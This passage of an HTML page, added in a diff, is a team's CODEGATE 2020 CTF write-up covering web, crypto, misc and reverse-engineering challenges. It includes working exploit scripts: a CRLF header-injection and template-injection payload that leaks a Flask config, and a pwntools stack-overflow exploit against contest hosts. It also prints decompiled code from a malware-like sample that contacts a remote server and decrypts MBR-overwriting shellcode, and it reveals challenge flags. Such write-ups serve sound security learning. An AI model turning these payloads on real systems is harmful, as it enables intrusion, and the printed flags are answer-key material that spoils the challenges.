+    <span class="hljs-keyword">return</span> urllib2.urlopen(url).read()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_log</span><span class="hljs-params">(rip)</span>:</span>
+    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
+    <span class="hljs-keyword">with</span> open(<span class="hljs-string">"/home/tickets/%s"</span> % tid, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
+        log_str = <span class="hljs-string">"Admin page accessed from %s"</span> % rip
+        f.write(log_str)
+
+    <span class="hljs-keyword">return</span> tid
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_extend_log</span><span class="hljs-params">(rip, body)</span>:</span>
+    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
+    <span class="hljs-keyword">with</span> open(<span class="hljs-string">"/home/tickets/%s"</span> % tid, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
+        f.write(body)
+
+    <span class="hljs-keyword">return</span> tid
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_log</span><span class="hljs-params">(ticket)</span>:</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (ticket <span class="hljs-keyword">and</span> ticket.isalnum()):
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+
+    <span class="hljs-keyword">if</span> path.exists(<span class="hljs-string">"/home/tickets/%s"</span> % ticket):
+        <span class="hljs-keyword">with</span> open(<span class="hljs-string">"/home/tickets/%s"</span> % ticket, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:
+            <span class="hljs-keyword">return</span> f.read()
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span></code></pre><p>I don&#39;t know what <code>write_extend_log</code>, <code>127.0.0.2</code>, <code>admin_local</code> are used for. Anyway:</p>
+<ol class="list">
+<li>The objective is <code>render_template_string</code> to RCE / read <code>config</code> because the flag is in <code>config</code></li>
+<li><code>get_real_ip</code> will get the IP address from a user-controlled HTTP header <code>X-Forwarded-For</code></li>
+<li>Accourding to <code>Dockerfile</code>, this python urllib is vulnerable to <a href="https://bugs.python.org/issue36276">CRLF injection</a>.</li>
+</ol>
+<p>The first <code>renderer/admin</code> should be easy to do. The real problem is the second <code>user-agent</code> one, because <code>urllib2</code> will also append its <code>user-agent</code> in the HTTP header. I was trying to inject <code>\r\n\r\n</code> to make the header become part of the HTTP body part, but nginx considers that&#39;s an invalid request and thus reply with HTTP 400.</p>
+<p>After more fuzzing, I found HTTP version is somehow related to this behavior. Injecting <code>\r\n\r\n</code> in HTTP/1.1 does not work for me, however to my surprise, HTTP/1.0 seems to work well here. The reason seems to be related to the <code>Host:</code> header. In order to make it work in HTTP/1.1, <a href="https://github.com/empty-jack/ctf-writeups/blob/master/CodeGate-2020/web-renderer.md">you need to inject <code>Host: 127.0.0.1\r\n</code></a>. I don&#39;t know if the root cause is RFC or nginx. Please let me know by creating a GitHub issue if you have anything in your mind. with HTTP/1.1. Not really sure how nginx parses these chaotic headers.</p>
+<p>Btw, HTTP version trick also appears in <a href="https://blog.pspaul.de/posts/plaidctf-2019-potent-quotables/">Plaid CTF 2019</a>.</p>
+<p>Here is my final payload:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3                                                                                                                   </span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+
+s = requests.session()
+
+url = <span class="hljs-string">'http://127.0.0.1/renderer/admin HTTP/1.1\r\nX-Forwarded-For:{{config}}YOLOzzw\r\n'</span>
+r = s.post(<span class="hljs-string">'http://58.229.253.144/renderer/'</span>, data=dict(url=url))
+print(r.text)
+tid = re.findall(<span class="hljs-string">'([0-9a-f]{40})'</span>, r.text)[<span class="hljs-number">0</span>]
+
+url = f<span class="hljs-string">'http://127.0.0.1/renderer/admin/ticket?ticket={tid} HTTP/1.0\r\nUser-agent: AdminBrowser/1.337\r\n\r\nA:'</span>
+r = s.post(<span class="hljs-string">'http://58.229.253.144/renderer/'</span>, data=dict(url=url))
+print(r.text, r.status_code)</code></pre><h4 id="train-of-thought-1"><a class="header-link" href="#train-of-thought-1"></a>Train of Thought</h4>
+<ol class="list">
+<li>Guessing the nginx path traversal trick to retrieve the source code</li>
+<li>Find out the Python version is vulnerable to HTTP header injection by virtual of CRLF injection</li>
+</ol>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="halffeed"><a class="header-link" href="#halffeed"></a>Halffeed</h3>
+<pre class="hljs"><code><span class="hljs-keyword">pt</span> = <span class="hljs-keyword">b</span><span class="hljs-string">'\x00'</span>*<span class="hljs-number">11</span> + <span class="hljs-keyword">b</span><span class="hljs-string">';cat '</span> + <span class="hljs-keyword">b</span><span class="hljs-string">'a'</span>*<span class="hljs-number">16</span>
+ct1, _ = get_enc(<span class="hljs-keyword">pt</span>)
+t1 = sxor(ct1[<span class="hljs-number">16</span>:], <span class="hljs-keyword">pt</span>[<span class="hljs-number">16</span>:])
+
+<span class="hljs-keyword">pt</span> = <span class="hljs-keyword">b</span><span class="hljs-string">'flag;'</span> + <span class="hljs-keyword">b</span><span class="hljs-string">'d'</span>*<span class="hljs-number">11</span>
+t2, ct2 = feed_plus(t1, <span class="hljs-keyword">pt</span>)
+
+<span class="hljs-keyword">pt</span> = <span class="hljs-keyword">b</span><span class="hljs-string">'b'</span>*<span class="hljs-number">16</span> + <span class="hljs-keyword">b</span><span class="hljs-string">'e'</span>*<span class="hljs-number">16</span>
+ct, _ = get_enc(<span class="hljs-keyword">pt</span>)
+t3 = sxor(ct[<span class="hljs-number">16</span>:], <span class="hljs-keyword">pt</span>[<span class="hljs-number">16</span>:])
+
+<span class="hljs-keyword">pt</span> = <span class="hljs-keyword">b</span><span class="hljs-string">'b'</span>*<span class="hljs-number">16</span> + sxor(t2[:<span class="hljs-number">8</span>], t3[:<span class="hljs-number">8</span>]) + <span class="hljs-keyword">b</span><span class="hljs-string">'d'</span>*<span class="hljs-number">8</span>
+_, <span class="hljs-keyword">tag</span> = get_enc(<span class="hljs-keyword">pt</span>)
+
+ct = ct1[:<span class="hljs-number">16</span>] + ct2
+do_exec(<span class="hljs-number">0</span>, ct, <span class="hljs-keyword">tag</span>)
+
+# CODEGATE2020{F33D1NG_0N1Y_H4LF_BL0CK_W1TH_BL0CK_C1PH3R}</code></pre><h3 id="munch"><a class="header-link" href="#munch"></a>Munch</h3>
+<p>In this task, We have an encrypted flag with RSA and some info about one of its prime <code>p</code>:</p>
+<ol class="list">
+<li>The prime <code>p</code> is split into 7 parts:<ul class="list">
+<li>[74bits] [35bits] [111bits] [35bits] [111bits] [35bits] [111bits]</li>
+</ul>
+</li>
+<li>Remove those 35bits parts</li>
+<li>We can get 52bits of MSBs of <code>y = part[i] * seed**(16 * k) mod m</code>, where k starts from 0 to 50, and we know what the seed is.</li>
+</ol>
+<p>We can reconstruct those parts with LLL algorithm. Consider following matrix:</p>
+<pre class="hljs"><code>M = [<span class="hljs-keyword">diag</span>(seed^(<span class="hljs-number">16</span>*k))   <span class="hljs-keyword">diag</span>(y&lt;&lt;shift)   I   m*I]</code></pre><p>we know that:</p>
+<pre class="hljs"><code>M * <span class="hljs-comment">[part<span class="hljs-comment">[i]</span>    -1    truncated_LSBs    modulo_parts]</span> = 0</code></pre><p>And we can find that vector by finding reduction basis on the right kernel of M.</p>
+<p>After we got those bits of prime p, we can reconstruct those missing 35bit parts using <a href="https://gist.github.com/jhs7jhs/0c26e83bb37866f5c7c6b8918a854333">multivariate coppersmith</a>.</p>
+<h3 id="polynomial"><a class="header-link" href="#polynomial"></a>Polynomial</h3>
+<p>The encryption algorithm is NTRU, and we can find some attacks of insecure parameters from its original paper. The weaker one can be solved by applying LLL on public key to find private key, but it doesn&#39;t work on the stronger one. To solve both of them, I use another attack by ciphertext to recover plaintext directly. Consider the following lattice:</p>
+<pre class="hljs"><code>H = Matrix(ZZ, h.matrix())
+<span class="hljs-keyword">C</span> = Matrix(ZZ, [outputs.list()])
+<span class="hljs-keyword">I</span>, <span class="hljs-keyword">O</span> = identity_matrix, zero_matrix
+nr, nc = H.nrows(), H.ncols()
+L = Matrix.block([
+    [a * <span class="hljs-keyword">I</span>(nr, nc),      H        ],
+    [    <span class="hljs-keyword">O</span>(nr, nc),  q * <span class="hljs-keyword">I</span>(nr, nc)],
+    [    <span class="hljs-keyword">O</span>(<span class="hljs-number">1</span>,  nc),      <span class="hljs-keyword">C</span>        ],
+])</code></pre><p><code>(ar, m)</code> is in the lattice, and we can find it with LLL algorithm.</p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="verifier"><a class="header-link" href="#verifier"></a>Verifier</h3>
+<pre class="hljs"><code>i = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+<span class="hljs-keyword">j </span>= <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+ans = <span class="hljs-number">3</span><span class="hljs-comment">;</span>
+[ i &lt; <span class="hljs-number">10</span> { <span class="hljs-keyword">j </span>= <span class="hljs-keyword">j </span>+ <span class="hljs-number">1</span> <span class="hljs-comment">; j &gt; 6 ? { ans = ans - 1 ; i = i + 1 } : { i = i + 1 } } ];</span>
+!ans</code></pre><h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
+<h3 id="orm-app"><a class="header-link" href="#orm-app"></a>ORM-APP</h3>
+<h4 id="reverse-the-emulator"><a class="header-link" href="#reverse-the-emulator"></a>Reverse the emulator</h4>
+<p>We have a binary of emulator and a special ISA binary. The code structure of emulator is quite simple. It just need a lot of human effort to figure out the definition of opcodes.</p>
+<pre class="hljs"><code>__int64 __<span class="hljs-function">fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **a3)</span>
+</span>{
+  task cpu; <span class="hljs-comment">// [rsp+10h] [rbp-40h]</span>
+  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span>
+
+  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);
+  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)a1 &lt;= <span class="hljs-number">1</span> )
+    usage((__int64)*argv);
+  unbuffering();
+  load(argv[<span class="hljs-number">1</span>], &amp;cpu);
+  <span class="hljs-keyword">if</span> ( !cpu.bin_info )
+  {
+    fwrite(<span class="hljs-string">"fatal: fail to initialize ORM.\n"</span>, <span class="hljs-number">1u</span>LL, <span class="hljs-number">0x1F</span>uLL, <span class="hljs-built_in">stderr</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+  }
+  run_emu(&amp;cpu);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;
+}
+
+<span class="hljs-keyword">void</span> __<span class="hljs-function">fastcall <span class="hljs-title">run_emu</span><span class="hljs-params">(task *cpu)</span>
+</span>{
+  <span class="hljs-keyword">while</span> ( !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)run(cpu) )
+    ;
+  <span class="hljs-keyword">switch</span> ( -cpu-&gt;errno )
+  {
+    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
+      fwrite(<span class="hljs-string">"ORM halted.\n"</span>, <span class="hljs-number">1u</span>LL, <span class="hljs-number">0xC</span>uLL, <span class="hljs-built_in">stderr</span>);
+      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+      <span class="hljs-keyword">return</span>;
+    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+      fwrite(<span class="hljs-string">"Invalid opcode.\n"</span>, <span class="hljs-number">1u</span>LL, <span class="hljs-number">0x10</span>uLL, <span class="hljs-built_in">stderr</span>);
+      <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
+      fwrite(<span class="hljs-string">"Segmentation fault.\n"</span>, <span class="hljs-number">1u</span>LL, <span class="hljs-number">0x14</span>uLL, <span class="hljs-built_in">stderr</span>);
+      <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
+      fwrite(<span class="hljs-string">"Invalid State.\n"</span>, <span class="hljs-number">1u</span>LL, <span class="hljs-number">0xF</span>uLL, <span class="hljs-built_in">stderr</span>);
+      <span class="hljs-keyword">break</span>;
+    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
+      fwrite(<span class="hljs-string">"Device error.\n"</span>, <span class="hljs-number">1u</span>LL, <span class="hljs-number">0xE</span>uLL, <span class="hljs-built_in">stderr</span>);
+      <span class="hljs-keyword">break</span>;
+  }
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+}
+
+__int64 __<span class="hljs-function">fastcall <span class="hljs-title">run</span><span class="hljs-params">(task *cpu)</span>
+</span>{
+  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span>
+  <span class="hljs-keyword">unsigned</span> __int8 opcode; <span class="hljs-comment">// [rsp+1Fh] [rbp-1h]</span>
+
+  opcode = get_data(cpu);
+  v1 = cpu-&gt;x64_x32;
+  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">4</span> )
+    <span class="hljs-keyword">return</span> operation_32[opcode &gt;&gt; <span class="hljs-number">3</span>](cpu, (opcode &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">1</span>, opcode &amp; <span class="hljs-number">3</span>);
+  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">8</span> )
+    <span class="hljs-keyword">return</span> operation_64[opcode &gt;&gt; <span class="hljs-number">3</span>](cpu, (opcode &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">1</span>, opcode &amp; <span class="hljs-number">3</span>);
+  cpu-&gt;errno = <span class="hljs-number">-3</span>;
+  <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;
+}
+
+.data:<span class="hljs-number">0000000000213120</span> ; __int64 (__fastcall *operation_64[<span class="hljs-number">32</span>])(task *task, <span class="hljs-keyword">char</span> flag, <span class="hljs-keyword">unsigned</span> __int8 a3)
+.data:<span class="hljs-number">0000000000213120</span> operation_64    dq offset nop           ; DATA XREF: run+<span class="hljs-number">89</span>↑o
+.data:<span class="hljs-number">0000000000213120</span>                                         ; run+<span class="hljs-number">90</span>↑r
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset push
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset pop
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset neg
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset add
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset sub
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset mul
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset div
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset mod
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset unsign_rshift
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset sign_rshift
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset lshift
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset and
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset or
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset xor
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset equl
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset nequl
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset unsign_b
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset unsign_beq
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset sign_b
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset sign_beq
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset jmp
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset jz
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset jnz
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset set_adr
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset sub_E298
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset call
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset write_mem
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset write_reg
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset read_mem
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset set_err
+.data:<span class="hljs-number">0000000000213120</span>                 dq offset set_err</code></pre><h4 id="exploit-the-program"><a class="header-link" href="#exploit-the-program"></a>Exploit the program</h4>
+<p>After we get the definition of opcodes, we write a loader and processor module to reverse the challenge program in IDA. The disassembler is far from perfect, but we can guess about what the program wants to do from its structure.</p>
+<p>It&#39;s main function is quite simple, it is just a switch on input and call corresponding routine based on our input:
+<img src="https://i.imgur.com/zYvLSIU.png" alt=""></p>
+<p>First of all, Let&#39;s find where the flag-related parts are:</p>
+<pre class="hljs"><code><span class="hljs-string">SEG3:</span><span class="hljs-number">90909090909091</span>A8 <span class="hljs-string">aMigratingCenso:</span>db <span class="hljs-string">"[+] Migrating ====== CENSORED: FLAG LOCATED HERE. ======"</span></code></pre><p class="img-container"><img src="https://i.imgur.com/eVNOkmK.png" alt=""></p>
+<pre class="hljs"><code>write(<span class="hljs-number">1</span>, aMigratingCenso, <span class="hljs-number">0xE</span>);</code></pre><p>The length specified won&#39;t print the flag out in normal case, so we need to find some vulnerability to leak that memory.</p>
+<p>The first bug we found is from <code>add</code> routine:
+<img src="https://i.imgur.com/68wL4nV.png" alt="">
+It won&#39;t check about how many projects is created, and it will overflow:
+<img src="https://i.imgur.com/Ld4IzCo.png" alt="">
+The memory layout looks like:</p>
+<pre class="hljs"><code><span class="hljs-string">SEG4:</span>A0A0A0A0A0A0A000 ; Segment <span class="hljs-string">type:</span> Pure data
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0A000 <span class="hljs-string">input:</span>          dq <span class="hljs-number">0</span>                    ; DATA <span class="hljs-string">XREF:</span> show+<span class="hljs-number">2</span>E↑r
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0A000                                         ; show+<span class="hljs-number">49</span>↑r ...
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0A008                 align <span class="hljs-number">0x1000</span>
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B000 <span class="hljs-string">project_count:</span>  dq <span class="hljs-number">0</span>                    ; DATA <span class="hljs-string">XREF:</span> get_project+<span class="hljs-number">4</span>↑r
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B000                                         ; add+<span class="hljs-number">1</span>↑r ...
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B008 <span class="hljs-string">projects:</span>       dq <span class="hljs-number">8</span> dup(<span class="hljs-number">0</span>)             ; DATA <span class="hljs-string">XREF:</span> get_project+<span class="hljs-number">1</span>A↑r
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B008                                         ; add+<span class="hljs-number">26</span>↑r ...
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B048 <span class="hljs-string">data:</span>           dq <span class="hljs-number">0</span>                    ; DATA <span class="hljs-string">XREF:</span> add+<span class="hljs-number">3</span>B↑r
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B048                                         ; migrate+D9↑r
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B050                 align <span class="hljs-number">0x1000</span>
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B050 ; end of <span class="hljs-string">'SEG4'</span>
+<span class="hljs-string">SEG4:</span>A0A0A0A0A0A0B050</code></pre><p><code>projects</code> is a pointer array points to its corresponding data. And data is an array of following structure:</p>
+<pre class="hljs"><code>char     name<span class="hljs-selector-attr">[8]</span>;
+char     description<span class="hljs-selector-attr">[0x80]</span>;
+uint64_t is_migrated;</code></pre><p>So after overflow, the name of first project will be overwritten we some address, and it makes the string longer because the null byte is overwritten.</p>
+<p>The second bug we found is that the program will segfault when we call migrate on overflowed project. We tried to hook on the emulator to figure out which instruction causing the segfault. Surprisingly, the reason is that program counter is in non executable data segment.
+We find the root cause is <code>strcpy</code> in <code>migrate</code> which overflow the stack.
+<img src="https://i.imgur.com/iDqg69r.png" alt=""></p>
+<p>Now, the path to our flag is clear: change the return address to flag printing gadget and win :)</p>
+<p>here is the exploit:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn import *
+
+p = remote(<span class="hljs-string">"110.10.147.39"</span>,<span class="hljs-number">31337</span>)
+def <span class="hljs-keyword">Add</span><span class="bash">(name, des):
+</span>    p.sendafter(b<span class="hljs-string">"&gt;&gt;&gt; "</span>,b<span class="hljs-string">'A'</span>)
+    p.sendafter(b<span class="hljs-string">"):"</span>, name)
+    p.sendafter(b<span class="hljs-string">"):"</span>, des)
+
+<span class="hljs-keyword">Add</span><span class="bash">(b<span class="hljs-string">'0'</span>,p64(0x80808080808084B6))
+</span>for _ in range(<span class="hljs-number">7</span>):
+    <span class="hljs-keyword">Add</span><span class="bash">(b<span class="hljs-string">'0'</span>,b<span class="hljs-string">'trash'</span>)
+</span>
+p.sendafter(b<span class="hljs-string">"&gt;&gt;&gt; "</span>,b<span class="hljs-string">'M'</span>)
+p.sendafter(b<span class="hljs-string">":"</span>,b<span class="hljs-string">'0'</span>)
+p.sendafter(b<span class="hljs-string">":"</span>,<span class="hljs-string">"trash"</span>)                                                                             
+flag = p.recvuntil(b<span class="hljs-string">"\x00"</span>)
+print(flag)</code></pre><h3 id="malicious"><a class="header-link" href="#malicious"></a>malicious</h3>
+<p>Looks very simple, the function at <code>0x403ED2</code> is useless, patch it.
+And the function at <code>0x403f8c</code> connect to an HTTP server on 195.157.15.100:818 to ask for a token, the token would be used as the first argument to call md5 function, which&#39;s not just a hash function, it would also affect the result of the shellcode in the next step. The md5 result should be <code>d4ee0fbbeb7ffd4fd7a7d477a7ecd922</code> which is the md5 result of <code>activate</code>.</p>
+<p>Then in the function at <code>0x403DB1</code>, it would decrypt the shellcode which was encrypted by camellia or something, that&#39;s not important, the result only affect by the token in the last step. </p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_403F8C</span><span class="hljs-params">()</span>
+</span>{
+  <span class="hljs-keyword">struct</span> sockaddr name; <span class="hljs-comment">// [esp+18h] [ebp-1B0h]</span>
+  <span class="hljs-keyword">struct</span> WSAData WSAData; <span class="hljs-comment">// [esp+28h] [ebp-1A0h]</span>
+  <span class="hljs-keyword">void</span> *Buf1; <span class="hljs-comment">// [esp+1B8h] [ebp-10h]</span>
+  SOCKET s; <span class="hljs-comment">// [esp+1BCh] [ebp-Ch]</span>
+
+  WSAStartup(<span class="hljs-number">0x202</span>u, &amp;WSAData);
+  s = socket(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
+  <span class="hljs-built_in">memset</span>(&amp;name, <span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>u);
+  name.sa_family = <span class="hljs-number">2</span>;
+  *(_DWORD *)&amp;name.sa_data[<span class="hljs-number">2</span>] = inet_addr(<span class="hljs-string">"195.157.15.100"</span>);
+  *(_WORD *)name.sa_data = htons(<span class="hljs-number">0x332C</span>u);
+  <span class="hljs-keyword">if</span> ( connect(s, &amp;name, <span class="hljs-number">16</span>) )
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  send(s, <span class="hljs-string">"GET /status HTTP/1.1\r\n"</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0</span>);
+  recv(s, token, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);
+  Buf1 = md5(token, <span class="hljs-number">8u</span>);
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">memcmp</span>(Buf1, &amp;md5_hash, <span class="hljs-number">0x10</span>u);
+}</code></pre><p>The decrypted shellcode is an MBR (the program base is <code>0x7c00</code>), it would copy itself to <code>0x600</code>, decrypt itself by xor <code>0xF4</code>, then jump to the <code>0x630</code>.</p>
+<p>Then the MBR use BIOS interrupt call 0x1A to get the current time, the value of <code>cx:dx</code> looks like <code>0x2020:0x0208</code> , the MBR check the year should be greater or equal to <code>0x30</code> or it would print out <code>Not a chance</code>.</p>
+<p>After that check, there is a loop :</p>
+<pre class="hljs"><code><span class="hljs-keyword">for</span> di <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xdead</span>):
+    <span class="hljs-keyword">for</span> si <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xbeef</span>):
+        <span class="hljs-built_in">write</span> sectors [<span class="hljs-number">1</span>:<span class="hljs-number">32</span>] <span class="hljs-keyword">on</span> disk <span class="hljs-keyword">to</span> memory <span class="hljs-number">0x1000</span>
+        concat sector [<span class="hljs-number">0</span>] <span class="hljs-keyword">on</span> disk <span class="hljs-keyword">after</span> <span class="hljs-keyword">that</span> (<span class="hljs-number">0x5000</span>, a sector <span class="hljs-keyword">is</span> <span class="hljs-number">0x200</span>)
+        overwrite <span class="hljs-keyword">the</span> sectors[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>] <span class="hljs-keyword">on</span> disk <span class="hljs-keyword">with</span> memory start <span class="hljs-keyword">from</span> <span class="hljs-number">0x1000</span>
+
+extract <span class="hljs-keyword">the</span> bytes <span class="hljs-keyword">of</span> flag <span class="hljs-keyword">on</span> each sector <span class="hljs-keyword">and</span> print out </code></pre><p>Illustrate the sectors after each loop:</p>
+<pre class="hljs"><code>#<span class="hljs-number">1</span>
+[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>]
+#<span class="hljs-number">2</span>
+[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]
+#<span class="hljs-number">3</span>
+[<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]</code></pre><p>Modifying the <code>di</code> as 1 and <code>si</code> as <code>(0xdead*0xbeef)%33</code> then we get the flag:</p>
+<p><code>CODEGATE2020{8_bits_per_byte_1_byte_per_sector}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
